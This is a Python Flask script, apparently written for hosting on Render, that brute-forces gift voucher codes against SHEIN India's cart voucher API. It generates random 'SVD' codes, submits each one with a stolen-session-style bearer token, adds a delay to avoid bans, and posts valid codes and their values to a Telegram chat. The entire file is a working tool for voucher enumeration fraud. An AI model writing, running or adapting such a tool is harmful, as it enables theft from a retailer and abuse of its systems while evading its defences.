import requests
import json
import os
import random
import string
import time
import threading
from datetime import datetime
from flask import Flask

# ======================================================
# CONFIGURATION (Fetched from Render Env Vars)
# ======================================================
ACCESS_TOKEN = os.getenv("ACCESS_TOKEN")
CART_ID = os.getenv("CART_ID")
EMAIL = os.getenv("EMAIL")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

app = Flask(__name__)

# Global Stats
stats = {
    "attempts": 0, 
    "valid": 0, 
    "start_time": time.time()
}

@app.route('/')
def health_check():
    """Web page for UptimeRobot and manual status checks"""
    elapsed = time.time() - stats["start_time"]
    cpm = int((stats["attempts"] / elapsed) * 60) if elapsed > 0 else 0
    uptime_min = int(elapsed // 60)
    
    return {
        "status": "Running",
        "attempts": stats["attempts"],
        "valid_codes": stats["valid"],
        "speed_cpm": cpm,
        "uptime_minutes": uptime_min,
        "last_checked": datetime.now().strftime('%H:%M:%S')
    }

def send_tg(message):
    """Sends notification to Telegram"""
    if not BOT_TOKEN or not CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}, timeout=5)
    except:
        pass

def checker_loop():
    """The background thread that generates and tests codes"""
    # Wait for Render to fully start
    time.sleep(5)
    
    if not ACCESS_TOKEN or "PASTE" in ACCESS_TOKEN:
        print("❌ CRITICAL ERROR: ACCESS_TOKEN is not set in Render Environment Variables!")
        send_tg("🚨 *Bot Error:* ACCESS_TOKEN is missing. Check Render settings.")
        return

    print(f"🚀 Checker started for: {EMAIL}")
    send_tg(f"🚀 *Render Bot Online!* Starting checks for account: {EMAIL}")

    api_url = f"https://api.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/{EMAIL}/carts/{CART_ID}/vouchers"
    prefix = "SVD"
    chars = string.ascii_uppercase + string.digits

    while True:
        code = f"{prefix}{''.join(random.choices(chars, k=12))}"
        headers = {
            "Authorization": f"Bearer {ACCESS_TOKEN.strip()}",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Android/35"
        }

        try:
            response = requests.post(api_url, headers=headers, data={"voucherId": code, "employeeOfferRestriction": "true"}, timeout=10)
            stats["attempts"] += 1

            # Heartbeat Report every 1000 tries
            if stats["attempts"] % 1000 == 0:
                elapsed = time.time() - stats["start_time"]
                cpm = int((stats["attempts"] / elapsed) * 60)
                send_tg(f"💓 *Heartbeat:* {stats['attempts']} tries done.\n✅ *Valid:* {stats['valid']}\n⚡ *Speed:* {cpm} CPM")

            # Check for Success
            if response.status_code in [200, 201]:
                stats["valid"] += 1
                full_json = response.json()
                applied = full_json.get("appliedVouchers", [])
                val = applied[0].get("displayformattedValue", "Success") if applied else "Success"
                
                print(f"✨ HIT! {code} is valid.")
                send_tg(f"🎯 *VALID CODE FOUND!*\n\n🎫 *Code:* `{code}`\n💰 *Value:* {val}\n📊 *Attempt:* {stats['attempts']}")
            
            # Check for Expired Token
            elif response.status_code == 401:
                print("🚨 Token Expired. Stopping...")
                send_tg("🚨 *Bot Stopped:* Your ACCESS_TOKEN has expired. Please update it in Render.")
                break
            
            # Anti-ban delay (0.5 seconds)
            time.sleep(0.5)

        except Exception as e:
            print(f"⚠️ Connection Error: {e}")
            time.sleep(10) # Wait if internet is unstable

if __name__ == "__main__":
    # Start the checker in the background
    threading.Thread(target=checker_loop, daemon=True).start()
    
    # Start the Web Server (Render uses the PORT env var)
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
